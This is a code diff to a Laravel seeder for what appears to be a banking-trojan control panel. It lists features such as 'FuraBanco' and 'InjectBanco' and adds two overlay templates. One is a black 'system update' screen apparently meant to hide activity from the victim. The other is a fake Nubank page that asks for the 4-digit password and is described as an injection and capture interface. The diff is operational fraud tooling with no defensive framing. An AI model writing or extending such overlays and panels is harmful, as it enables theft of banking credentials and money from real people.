@@ -3,6 +3,7 @@ namespace Database\Seeders;
 
 use App\Models\User;
 use App\Models\Plan;
+use App\Models\Template;
 use Illuminate\Database\Seeder;
 
 class DatabaseSeeder extends Seeder
@@ -51,6 +52,18 @@ class DatabaseSeeder extends Seeder
             'funcionalidades' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
             'conta_status'    => 'expiring_soon',
             'conta_expira_em' => now()->addDays(3),
+        ]);
+
+        Template::updateOrCreate(['title' => 'Tela Preta Overlay v1'], [
+            'galeria'     => 'screen',
+            'description' => 'Tela preta para bloqueio de tela e capturas.',
+            'html'        => '<!DOCTYPE html><html><head><title>Overlay</title><style>body{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}</style></head><body><h1>Aguarde a atualização do sistema...</h1></body></html>',
+        ]);
+
+        Template::updateOrCreate(['title' => 'Inject Nubank v2'], [
+            'galeria'     => 'inject',
+            'description' => 'Interface de injeção e captura para Nubank.',
+            'html'        => '<!DOCTYPE html><html><head><title>Nubank</title><style>body{background:#820ad1;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}</style></head><body><h2>Informe sua senha de 4 dígitos</h2></body></html>',
         ]);
     }
 }
